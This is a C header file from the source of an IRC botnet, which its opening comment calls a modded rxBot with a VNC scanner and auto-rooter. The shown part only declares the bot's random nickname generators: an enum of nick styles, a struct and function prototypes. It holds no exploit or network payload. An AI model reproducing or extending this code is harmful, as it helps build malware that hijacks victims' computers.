/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


enum {CONSTNICK, LETTERNICK, LETNUMNICK, COMPNICK, COUNTRYNICK, OSNICK};

typedef char * (*rnref)(char *strbuf);

typedef struct RNICK 
{
	char name[10];
	int type;
	rnref rnfunc;

} RNICK;

#ifndef NO_REALNICK
char *rndnickreal(char *strbuf);
#endif
char *rndnickconst(char *strbuf);
char *rndnickletter(char *strbuf);
char *rndnickletternumbers(char *strbuf);
char *rndnickcomp(char *strbuf);
char *rndnickcountry(char *strbuf);
char *rndnickos(char *strbuf);
char *prefixnick(char *strbuf);
char *rndnick(char *strbuf, int type=LETTERNICK, BOOL prefix=FALSE, char *name=NULL);

